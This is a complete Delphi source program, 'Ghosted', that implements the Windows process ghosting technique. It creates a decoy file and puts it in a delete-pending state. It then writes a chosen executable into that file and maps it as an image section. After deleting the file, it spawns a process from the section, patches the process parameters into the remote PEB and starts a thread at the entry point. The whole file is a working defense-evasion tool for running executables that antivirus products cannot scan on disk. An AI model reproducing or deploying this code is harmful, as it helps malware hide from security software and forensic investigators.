program Ghosted;

{$APPTYPE CONSOLE}

uses
  Winapi.Windows,
  System.SysUtils,
  Structs;

const
  FILE_READ_DATA = $0001; // file & pipe
  FILE_WRITE_DATA = $0002; // file & pipe
  FILE_APPEND_DATA = $0004; // file
  FILE_READ_EA = $0008; // file & directory
  FILE_WRITE_EA = $0010; // file & directory
  FILE_READ_ATTRIBUTES = $0080; // all
  FILE_WRITE_ATTRIBUTES = $0100; // all
  STANDARD_RIGHTS_READ = $20000;
  STANDARD_RIGHTS_WRITE = $20000;

  FILE_GENERIC_READ = (STANDARD_RIGHTS_READ or FILE_READ_DATA or
    FILE_READ_ATTRIBUTES or FILE_READ_EA or SYNCHRONIZE);

  FILE_GENERIC_WRITE = (STANDARD_RIGHTS_WRITE or FILE_WRITE_DATA or
    FILE_WRITE_ATTRIBUTES or FILE_WRITE_EA or FILE_APPEND_DATA or SYNCHRONIZE);

const
  FILE_ACCESS_MASK = DWORD($10000) or DWORD($00100000) or DWORD($80000000) or
    DWORD($40000000);
  FILE_SHARE_MASK = DWORD($00000001) or DWORD($00000002);

type
  // Process info structure
  PCP_INFO = ^CP_INFO;

  CP_INFO = record
    p_handle: THandle;
    pb_info: PROCESS_BASIC_INFORMATION;
  end;

  // NT API function declarations
function NtSetInformationFile(FileHandle: THandle;
  IoStatusBlock: PIO_STATUS_BLOCK; FileInformation: Pointer; Length: ULONG;
  FileInformationClass: ULONG): NTSTATUS; stdcall; external 'ntdll.dll';

const
  SECTION_ALL_ACCESS = $F001F;
  PAGE_READONLY = $02;
  SEC_IMAGE = $1000000;

function NtCreateSection(SectionHandle: PHANDLE; DesiredAccess: ACCESS_MASK;
  ObjectAttributes: POBJECT_ATTRIBUTES; MaximumSize: PLargeInteger;
  SectionPageProtection: ULONG; AllocationAttributes: ULONG;
  FileHandle: THandle): NTSTATUS; stdcall; external 'ntdll.dll';

const
  STANDARD_RIGHTS_REQUIRED = $000F0000;
  SYNCHRONIZE = $00100000;
  THREAD_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED or SYNCHRONIZE or $FFFF);
  CREATE_SUSPENDED = $00000004;
{
function NtCreateProcessEx(ProcessHandle: PHANDLE;
  DesiredAccess: ACCESS_MASK; ObjectAttributes: POBJECT_ATTRIBUTES;
  ParentProcess: THandle; Flags: ULONG; SectionHandle: THandle;
  DebugPort: THandle; ExceptionPort: THandle; InJob: BOOLEAN): NTSTATUS;
  stdcall; external 'ntdll.dll';
}
function NtCreateProcess(
  ProcessHandle: PHANDLE;
  DesiredAccess: ACCESS_MASK;
  ObjectAttributes: POBJECT_ATTRIBUTES;
  ParentProcess: THandle;
  InheritObjectTable: Boolean;
  SectionHandle: THandle;
  DebugPort: THandle;
  ExceptionPort: THandle): NTSTATUS; stdcall; external 'ntdll.dll';

const
  THREAD_SET_INFORMATION = $0020;

function NtCreateThreadEx(ThreadHandle: PHANDLE; DesiredAccess: ACCESS_MASK;
  ObjectAttributes: POBJECT_ATTRIBUTES; ProcessHandle: THandle;
  StartRoutine: Pointer; Argument: Pointer; CreateFlags: ULONG;
  ZeroBits: ULONG_PTR; StackSize: SIZE_T; MaximumStackSize: SIZE_T;
  AttributeList: Pointer): NTSTATUS; stdcall; external 'ntdll.dll';

function NtQueryInformationProcess(ProcessHandle: THandle;
  ProcessInformationClass: PROCESSINFOCLASS; ProcessInformation: Pointer;
  ProcessInformationLength: ULONG; ReturnLength: PULONG): NTSTATUS; stdcall;
  external 'ntdll.dll';

function NtReadVirtualMemory(ProcessHandle: THandle; BaseAddress: LPVOID;
  Buffer: LPVOID; BufferSize: SIZE_T; NumberOfBytesRead: PSIZE_T): NTSTATUS;
  stdcall; external 'ntdll.dll';

type
  PZZWSTR = PWideChar;
  PPZZWSTR = ^PZZWSTR;

function RtlCreateProcessParameters(out ProcessParameters
  : PRTL_USER_PROCESS_PARAMETERS; ImagePathName: PUNICODE_STRING;
  DllPath: PUNICODE_STRING; CurrentDirectory: PUNICODE_STRING;
  CommandLine: PUNICODE_STRING; Environment: LPVOID;
  WindowTitle: PUNICODE_STRING; DesktopInfo: PUNICODE_STRING;
  ShellInfo: PUNICODE_STRING; RuntimeData: PUNICODE_STRING): NTSTATUS; stdcall;
  external 'ntdll.dll';

procedure RtlInitUnicodeString(DestinationString: PUNICODE_STRING;
  SourceString: PWideChar); stdcall; external 'ntdll.dll';

function CreateEnvironmentBlock(lpEnvironment: PPZZWSTR; hToken: THandle;
  bInherit: BOOL): BOOL; stdcall; external 'userenv.dll';

function WriteProcessMemory(hProcess: THandle; lpBaseAddress: LPVOID;
  lpBuffer: LPVOID; nSize: SIZE_T; lpNumberOfBytesWritten: PSIZE_T): BOOL;
  stdcall; external 'kernel32.dll' name 'WriteProcessMemory';

// Get NT Header
function GetNtHdr(base_addr: PByte): PIMAGE_NT_HEADERS;
var
  dos_hdr: PIMAGE_DOS_HEADER;
  pe_offset: LongInt;
  nt_hdr: PIMAGE_NT_HEADERS;
begin
  Result := nil;

  // Get DOS Header
  dos_hdr := PIMAGE_DOS_HEADER(base_addr);
  if dos_hdr.e_magic <> IMAGE_DOS_SIGNATURE then
  begin
    Writeln('[!] Invalid DOS Header');
    Exit;
  end;

  // Get PE Offset
  pe_offset := dos_hdr.e_lfanew;
  Writeln(Format('> PE Offset 0x%x', [pe_offset]));

  // Check if offset is beyond bounds
  if pe_offset > 1024 then
  begin
    Writeln('[!] PE Offset beyond bounds');
    Exit;
  end;

  // Get NT Header
  nt_hdr := PIMAGE_NT_HEADERS(base_addr + pe_offset);
  if nt_hdr.Signature <> IMAGE_NT_SIGNATURE then
  begin
    Writeln('[!] Invalid NT Signature!');
    Exit;
  end;

  Result := nt_hdr;
end;

// Get Entrypoint Relative Virtual Address
function GetEpRva(base_addr: Pointer): DWORD;
var
  nt_hdr: PIMAGE_NT_HEADERS;
begin
  Result := 0;

  nt_hdr := GetNtHdr(PByte(base_addr));
  if nt_hdr = nil then
    Exit;

  Result := nt_hdr.OptionalHeader.AddressOfEntryPoint;
end;

function PrepareTarget(target_exe: PAnsiChar): THandle;
var
  h_tfile: THandle;
  _status: NTSTATUS;
  io_status: IO_STATUS_BLOCK;
  f_fileinfo: FILE_DISPOSITION_INFORMATION;
  f_info: FILE_INFORMATION_CLASS;
begin
  Result := 0;

  // Initialize file info
  f_fileinfo.DeleteFile := True;

  // Create Fake File
  h_tfile := CreateFileA(target_exe, FILE_ACCESS_MASK, FILE_SHARE_MASK, nil,
    OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

  if h_tfile = INVALID_HANDLE_VALUE then
  begin
    Writeln(Format('[!] Failed to create: %s(0x%x)',
      [target_exe, GetLastError]));
    Exit;
  end;

  Writeln(Format('> Created File: %s', [target_exe]));

  // Setting Target File in Delete Pending State
  FillChar(io_status, SizeOf(io_status), 0);

  f_info := FileDispositionInformation;

  _status := NtSetInformationFile(h_tfile, @io_status, @f_fileinfo,
    SizeOf(f_fileinfo), DWORD(f_info) // Cast enum to DWORD for the API call
    );

  if not NT_SUCCESS(_status) then
  begin
    Writeln(Format('[!] NtSetInformationFile failed (0x%x)', [_status]));
    CloseHandle(h_tfile);
    Exit;
  end;

  if not NT_SUCCESS(io_status.Status) then
  begin
    Writeln(Format('[!] Failed to put file in ''Delete-Pending'' State (0x%x)',
      [_status]));
    CloseHandle(h_tfile);
    Exit;
  end;

  Writeln('> Put file in ''Delete-Pending'' state');
  Result := h_tfile;
end;

type
  TMemoryBuffer = record
    Buffer: PByte;
    Size: DWORD;
  end;

function ReadOrigExe(original_exe: PAnsiChar): TMemoryBuffer;
var
  hfile: THandle;
  ho_fsz, lo_fsz: DWORD;
  s_bytes: PByte;
  bytesRead: DWORD;
begin
  Result.Buffer := nil;
  Result.Size := 0;

  // Open file for reading with shared access
  hfile := CreateFileA(original_exe, GENERIC_READ, FILE_SHARE_READ,
    // Allow shared access to prevent file locking issues
    nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

  if hfile = INVALID_HANDLE_VALUE then
  begin
    Writeln(Format('[!] Could not open %s for reading (0x%x)',
      [original_exe, GetLastError]));
    Exit;
  end;

  Writeln('> Opened Original Exe for reading');

  try
    // Get File Size
    lo_fsz := GetFileSize(hfile, @ho_fsz);
    if (lo_fsz = INVALID_FILE_SIZE) or (lo_fsz = 0) then
    begin
      Writeln(Format('[!] Failed to get valid file size (0x%x)',
        [GetLastError]));
      Exit;
    end;

    Result.Size := lo_fsz; // Store the file size in the result record

    // Allocate memory for the file data
    GetMem(s_bytes, lo_fsz);
    if s_bytes = nil then
    begin
      Writeln('[!] Memory allocation failed');
      Exit;
    end;

    // Read File
    if not ReadFile(hfile, s_bytes^, lo_fsz, bytesRead, nil) then
    begin
      Writeln(Format('[!] Failed to read %s (0x%x)',
        [original_exe, GetLastError]));
      FreeMem(s_bytes); // Free allocated memory on failure
      Exit;
    end;

    // Check if all bytes were read
    if bytesRead <> lo_fsz then
    begin
      Writeln(Format('[!] Read incomplete: Expected %d bytes, got %d bytes',
        [lo_fsz, bytesRead]));
      FreeMem(s_bytes);
      Exit;
    end;

    Result.Buffer := s_bytes; // Assign the allocated buffer to the result

  finally
    CloseHandle(hfile);
  end;
end;

// Write to Fake file and create sections
function FetchSections(hfile: THandle; f_bytes: PByte; f_size: DWORD): THandle;
var
  _res: BOOL;
  hsection: THandle;
  _ho_fsz: Cardinal; // Use Cardinal to match the type expected by WriteFile
  _status: NTSTATUS;
begin
  Result := 0; // Initialize result to null handle

  // Validate input buffer
  if (f_bytes = nil) or (f_size = 0) then
  begin
    Writeln('[!] Invalid buffer or size');
    Exit;
  end;

  // Write to open handle of the file
  _res := WriteFile(hfile, f_bytes^, // Pass the actual data from the buffer
    f_size, _ho_fsz, // Pass the address of _ho_fsz (Cardinal is correct type)
    nil);

  if not _res then
  begin
    Writeln(Format('[!] Failed to write payload (0x%x)', [GetLastError]));
    Exit;
  end;

  Writeln(Format('> Wrote %d bytes to target!', [_ho_fsz]));

  // Create section object
  hsection := 0;
  _status := NtCreateSection(@hsection, SECTION_ALL_ACCESS, nil, nil,
    // Use nil for MaximumSize parameter
    PAGE_READONLY, SEC_IMAGE, hfile);

  if not NT_SUCCESS(_status) then
  begin
    Writeln(Format('[!] NtCreateSection() failed! (0x%x)', [_status]));
    Exit;
  end;

  if (hsection = INVALID_HANDLE_VALUE) or (hsection = 0) then
  begin
    Writeln(Format('[!] Invalid Handle returned by NtCreateSection() (0x%x)',
      [_status]));
    Exit;
  end;

  Writeln('> Created a section object!');
  Result := hsection;
end;


// Create Child process, query it and return a handle
function CreateCP(hsection: THandle): PCP_INFO;
var
  _status: NTSTATUS;
  retlen: DWORD;
  p_info: PCP_INFO;
begin
  Result := nil;

  GetMem(p_info, SizeOf(CP_INFO));
  if p_info = nil then
  begin
    Writeln('[!] Memory allocation failed');
    Exit;
  end;

  FillChar(p_info^, SizeOf(CP_INFO), 0);
  {
  _status := NtCreateProcessEx(@p_info^.p_handle, PROCESS_ALL_ACCESS, nil,
    GetCurrentProcess, PS_INHERIT_HANDLES or CREATE_SUSPENDED, hsection, 0, 0, False); }

    _status := NtCreateProcess(
  @p_info^.p_handle,
  PROCESS_ALL_ACCESS,
  nil,
  GetCurrentProcess,
  True,
  hsection,
  0,
  0);


  if not NT_SUCCESS(_status) then
  begin
    Writeln(Format('[!] NtCreateProcess() failed (0x%x)', [_status]));
    Exit;
  end;

  if (p_info^.p_handle = 0) or (p_info^.p_handle = INVALID_HANDLE_VALUE) then
  begin
    Writeln('[!] Invalid Handle returned by NtCreateProcess()');
    Exit;
  end;

  _status := NtQueryInformationProcess(p_info^.p_handle,
    ProcessBasicInformation, @p_info^.pb_info,
    SizeOf(PROCESS_BASIC_INFORMATION), nil);

  if not NT_SUCCESS(_status) then
  begin
    Writeln(Format('[!] NtQueryInformationProcess() failed (0x%x)', [_status]));
    CloseHandle(p_info^.p_handle);
    Exit;
  end;

  Writeln(Format('> Process ID: %d', [GetProcessId(p_info^.p_handle)]));
  Result := p_info;
end;

function WriteParams(hProcess: THandle;
  proc_params: PRTL_USER_PROCESS_PARAMETERS): Pointer;
var
  Buffer: Pointer;
  env_end: NativeUInt;
  buffer_end: NativeUInt;
  buffer_size: SIZE_T;
begin
  Result := nil;

  // Check for empty parameters
  if proc_params = nil then
  begin
    Writeln('[!] Empty Process Parameters');
    Exit;
  end;

  Buffer := proc_params;
  env_end := 0;
  buffer_end := NativeUInt(proc_params) + proc_params^.Length;

  // Check for environment variables
  if proc_params^.Environment <> nil then
  begin
    if NativeUInt(proc_params) > NativeUInt(proc_params^.Environment) then
      Buffer := proc_params^.Environment;

    env_end := NativeUInt(proc_params^.Environment) +
      proc_params^.EnvironmentSize;
    if env_end > buffer_end then
      buffer_end := env_end;
  end;

  // Calculate buffer size
  buffer_size := buffer_end - NativeUInt(Buffer);

  // First attempt: Try to allocate continuous space
  if VirtualAllocEx(hProcess, Buffer, buffer_size, MEM_COMMIT or MEM_RESERVE,
    PAGE_READWRITE) <> nil then
  begin
    if not WriteProcessMemory(hProcess, proc_params, proc_params,
      proc_params^.Length, nil) then
    begin
      Writeln(Format('[!] WriteProcessMemory() failed (0x%x)', [GetLastError]));
      Exit;
    end;

    if proc_params^.Environment <> nil then
    begin
      if not WriteProcessMemory(hProcess, proc_params^.Environment,
        proc_params^.Environment, proc_params^.EnvironmentSize, nil) then
      begin
        Writeln(Format('[!] WriteProcessMemory() failed (0x%x)',
          [GetLastError]));
        Exit;
      end;
    end;

    Result := proc_params;
    Exit;
  end;

  // Second attempt: Try to allocate in separate chunks
  if VirtualAllocEx(hProcess, proc_params, proc_params^.Length,
    MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE) = nil then
  begin
    Writeln(Format('[!] VirtualAllocEx() failed (0x%x)', [GetLastError]));
    Exit;
  end;

  if not WriteProcessMemory(hProcess, proc_params, proc_params,
    proc_params^.Length, nil) then
  begin
    Writeln(Format('[!] WriteProcessMemory() failed (0x%x)', [GetLastError]));
    Exit;
  end;

  if proc_params^.Environment <> nil then
  begin
    if VirtualAllocEx(hProcess, proc_params^.Environment,
      proc_params^.EnvironmentSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE) = nil
    then
    begin
      Writeln(Format('[!] VirtualAllocEx() failed (0x%x)', [GetLastError]));
      Exit;
    end;

    if not WriteProcessMemory(hProcess, proc_params^.Environment,
      proc_params^.Environment, proc_params^.EnvironmentSize, nil) then
    begin
      Writeln(Format('[!] WriteProcessMemory() failed (0x%x)', [GetLastError]));
      Exit;
    end;
  end;

  Result := proc_params;
end;

function ReadPeb(hProcess: THandle; p_info: PPROCESS_BASIC_INFORMATION): PPEB;
var
  peb: PPEB;
  peb_addr: PPEB;
  _status: NTSTATUS;
begin
  Result := nil;

  // Allocate memory for PEB
  GetMem(peb, SizeOf(peb));
  if peb = nil then
  begin
    Writeln(Format('[!] Memory allocation failed (0x%x)', [GetLastError]));
    Exit;
  end;

  try
    // Initialize memory
    FillChar(peb^, SizeOf(peb), 0); // Equivalent to memset

    // Get PEB address from process info
    peb_addr := p_info^.PebBaseAddress;

    // Read the PEB from remote process
    _status := NtReadVirtualMemory(hProcess, peb_addr, peb, SizeOf(peb), nil);

    if not NT_SUCCESS(_status) then
    begin
      Writeln(Format('[!] Cannot read remote PEB - %.8x', [GetLastError]));
      Exit;
    end;

    Result := peb;

  except
    // Clean up on any exception
    if peb <> nil then
      FreeMem(peb);
    raise;
  end;
end;

// Write to process memory
function WriteParamsToProcessMemory(lpParamsBase: LPVOID; hProcess: THandle;
  stPBI: PPROCESS_BASIC_INFORMATION): BOOL;
var
  ullPEBAddress: ULONGLONG;
  stPEBCopy: peb;
  ullOffset: ULONGLONG;
  lpIMGBase: LPVOID;
  lpulWritten: SIZE_T;
begin
  Result := False;

  // Get access to the remote PEB
  ullPEBAddress := ULONGLONG(stPBI^.PebBaseAddress);
  if ullPEBAddress = 0 then
  begin
    Writeln('Failed - Getting remote PEB address error!');
    Exit;
  end;

  // Initialize PEB copy
  FillChar(stPEBCopy, SizeOf(peb), 0);

  // Calculate offset of the parameters
  // Get the offset of ProcessParameters within PEB structure
  ullOffset := ULONGLONG(@stPEBCopy.ProcessParameters) - ULONGLONG(@stPEBCopy);

  // Calculate address where we need to write
  lpIMGBase := LPVOID(ullPEBAddress + ullOffset);

  // Write to process memory
  lpulWritten := 0;
  if not WriteProcessMemory(hProcess, lpIMGBase, @lpParamsBase, SizeOf(LPVOID),
    @lpulWritten) then
  begin
    Writeln('Failed - Cannot update Params!');
    Exit;
  end;

  Result := True;
end;

// Assign process arguments and environment variables
function SetEnv(p_info: PCP_INFO; w_target_name: PWideChar): BOOL;
var
  _status: NTSTATUS;
  param: LPVOID;
  env: LPVOID;
  peb_copy: PPEB;
  u_tpath, u_dll_dir, u_curr_dir, u_window_name: UNICODE_STRING;
  w_dir_path: array [0 .. MAX_PATH - 1] of WideChar;
  proc_params: PRTL_USER_PROCESS_PARAMETERS;
begin
  Result := False;

  // Initialize variables
  FillChar(u_tpath, SizeOf(UNICODE_STRING), 0);
  FillChar(u_dll_dir, SizeOf(UNICODE_STRING), 0);
  FillChar(u_curr_dir, SizeOf(UNICODE_STRING), 0);
  FillChar(w_dir_path, SizeOf(w_dir_path), 0);
  FillChar(u_window_name, SizeOf(UNICODE_STRING), 0);
  proc_params := nil;
  peb_copy := nil;

  try
    // Initialize Target Path
    RtlInitUnicodeString(@u_tpath, w_target_name);

    // Get Current Directory
    if GetCurrentDirectoryW(MAX_PATH, w_dir_path) = 0 then
    begin
      Writeln(Format('[!] Failed to fetch Current Directory (0x%x)',
        [GetLastError]));
      Exit;
    end;
    Writeln(Format('> Current Directory: %s', [w_dir_path]));

    // Initialize Current Directory string
    RtlInitUnicodeString(@u_curr_dir, @w_dir_path[0]);

    // Initialize DLL Path
    RtlInitUnicodeString(@u_dll_dir, 'C:\Windows\System32');

    // Initialize Window Name
    RtlInitUnicodeString(@u_window_name, 'window_name');

    // Create Environment Block
    env := nil;
    if not CreateEnvironmentBlock(@env, 0, True) then
    begin
      Writeln(Format('[!] CreateEnvironmentBlock() failed (0x%x)',
        [GetLastError]));
      Exit;
    end;

    // Create Process Parameters
    _status := RtlCreateProcessParameters(proc_params,
      // Remove @ since it's an out parameter
      @u_tpath, @u_dll_dir, @u_curr_dir, @u_tpath, env, @u_window_name, nil,
      nil, nil);

    if _status < 0 then // NT_SUCCESS equivalent
    begin
      Writeln('RtlCreateProcessParameters() failed');
      Exit;
    end;

    // Write parameters to process
    param := WriteParams(p_info^.p_handle, proc_params);
    if param = nil then
      Exit;

    // Read PEB
    peb_copy := ReadPeb(p_info^.p_handle, @p_info^.pb_info);
    if peb_copy = nil then
      Exit;

    // Write parameters to process memory
    if not WriteParamsToProcessMemory(param, p_info^.p_handle, @p_info^.pb_info)
    then
    begin
      Writeln(Format('Failed - Cannot update PEB: %.8x', [GetLastError]));
      Exit;
    end;

    Result := True;

  finally
    // Cleanup
    if peb_copy <> nil then
      FreeMem(peb_copy);
  end;
end;

// Spawn a process using ghosting
function SpawnProcess(real_exe, fake_exe: PAnsiChar): Integer;
var
  fileBuffer: TMemoryBuffer;
  hfakefile, hsection: THandle;
  p_info: PCP_INFO;
  entry_point: DWORD;
  w_fname: PWideChar;
  _peb_copy: PPEB;
  peb_copy: peb;
  image_base, proc_entry: ULONGLONG;
  hthread: THandle;
  _status: NTSTATUS;
  convertedChars: Integer;

begin
  Result := 0;

  // Create fake executable and put it in delete-pending state
  hfakefile := PrepareTarget(fake_exe);
  if hfakefile = 0 then
  begin
    Result := -1;
    Exit;
  end;

  try
    // Read contents from the real executable
    fileBuffer := ReadOrigExe(real_exe);
    if fileBuffer.Buffer = nil then
    begin
      Result := -2;
      Exit;
    end;

    try
      // Fetch Section object
      hsection := FetchSections(hfakefile, fileBuffer.Buffer, fileBuffer.Size);
      if hsection = 0 then
      begin
        Result := -3;
        Exit;
      end;

      try
        // Get Entry Point of PE image
        entry_point := GetEpRva(fileBuffer.Buffer);

        Writeln('> Deleting Fake File');
        CloseHandle(hfakefile);
        hfakefile := 0; // Mark as closed

        if entry_point = 0 then
        begin
          Result := -5;
          Exit;
        end;

        Writeln(Format('> Entry Point: 0x%.8x', [entry_point]));
        Writeln('===== Creating Child Process =====');

        p_info := CreateCP(hsection);
        if p_info = nil then
        begin
          Result := -6;
          Exit;
        end;

        try
          CloseHandle(hsection);
          hsection := 0; // Mark as closed

          Writeln('==== Assign process arguments and environment variables ====');

          // Convert filename to wide string
          GetMem(w_fname, (Length(fake_exe) + 1) * SizeOf(WideChar));
          if w_fname = nil then
          begin
            Writeln('[!] Failed to allocate memory for Wide File Name');
            Result := -7;
            Exit;
          end;

          try
            FillChar(w_fname^, (Length(fake_exe) + 1) * SizeOf(WideChar), 0);

            convertedChars := MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED,
              fake_exe, -1, w_fname, (Length(fake_exe) + 1));

            if convertedChars = 0 then
            begin
              Writeln('[!] MultiByteToWideChar() failed');
              Result := -8;
              Exit;
            end;

            var
              peb: peb;
            var
              peb_data: PPEB;
            begin
              peb_data := p_info^.pb_info.PebBaseAddress;

              // Read current PEB data
              NtReadVirtualMemory(p_info^.p_handle, peb_data, @peb,
                SizeOf(peb), nil);
            end;

            if not SetEnv(p_info, w_fname) then
            begin
              Writeln('[!] Failed to set environment variables');
              Result := -9;
              Exit;
            end;

            Writeln('> Set Environment and Proc Args');

            try

              NtReadVirtualMemory(p_info^.p_handle,
                p_info^.pb_info.PebBaseAddress, @peb_copy, SizeOf(peb), nil);

              image_base := ULONGLONG(peb_copy.ImageBase);
              proc_entry := entry_point + image_base;

              Writeln('==== Creating Thread In Child Process ====');

              hthread := 0;
              _status := NtCreateThreadEx(@hthread, THREAD_ALL_ACCESS, nil,
                p_info^.p_handle, Pointer(proc_entry), nil, 0, 0, 0, 0, nil);

              if not NT_SUCCESS(_status) then
              begin
                Writeln(Format('[!] NtCreateThreadEx() failed(0x%x)',
                  [_status]));
                Result := -11;
                Exit;
              end;

              if hthread = 0 then
              begin
                Writeln(Format('[!] Invalid Thread Handle (0x%x)',
                  [GetLastError]));
                Result := -13;
                Exit;
              end;

              try
                Writeln(Format('> Success - Thread ID %d',
                  [GetThreadId(hthread)]));
                WaitForSingleObject(p_info^.p_handle, INFINITE);
              finally
                CloseHandle(hthread);
              end;

            finally
              FreeMem(_peb_copy);
            end;

          finally
            FreeMem(w_fname);
          end;

        finally
          CloseHandle(p_info^.p_handle);
          FreeMem(p_info);
        end;

      finally
        if hsection <> 0 then
          CloseHandle(hsection);
      end;

    finally
      FreeMem(fileBuffer.Buffer);
    end;

  finally
    if hfakefile <> 0 then
      CloseHandle(hfakefile);
  end;
end;

begin

  try
    // Check command line parameters
    if ParamCount <> 2 then
    begin
      Writeln('[!] Invalid Usage');
      Writeln(Format('[i] Usage: %s <REAL EXE> <FAKE EXE>',
        [ExtractFileName(ParamStr(0))]));
      Exit();
    end;

    Writeln('==== Ghost Processes ====');

    var
      real_exe: array [0 .. MAX_PATH - 1] of AnsiChar;
    var
      fake_exe: array [0 .. MAX_PATH - 1] of AnsiChar;
    var
      Result: Integer;

      // Initialize arrays
    FillChar(real_exe, SizeOf(real_exe), 0);
    FillChar(fake_exe, SizeOf(fake_exe), 0);

    // Copy parameters
    StrPLCopy(real_exe, AnsiString(ParamStr(1)), MAX_PATH - 1);
    StrPLCopy(fake_exe, AnsiString(ParamStr(2)), MAX_PATH - 1);

    // Check if real_exe exists and is readable
    if not FileExists(string(real_exe)) then
    begin
      Writeln(Format('[!] Failed to access: %s', [real_exe]));
      Exit();
    end;

    // Check fake_exe does not exist
    if FileExists(string(fake_exe)) then
    begin
      Writeln(Format('[!] File already present: %s', [fake_exe]));
      Exit();
    end;

    // Call spawn_process
    Result := SpawnProcess(PAnsiChar(@real_exe[0]), PAnsiChar(@fake_exe[0]));
    Exit();

  except
    on E: Exception do
    begin
      Writeln(E.ClassName, ': ', E.Message);
      Exit();
    end;
  end;

end.
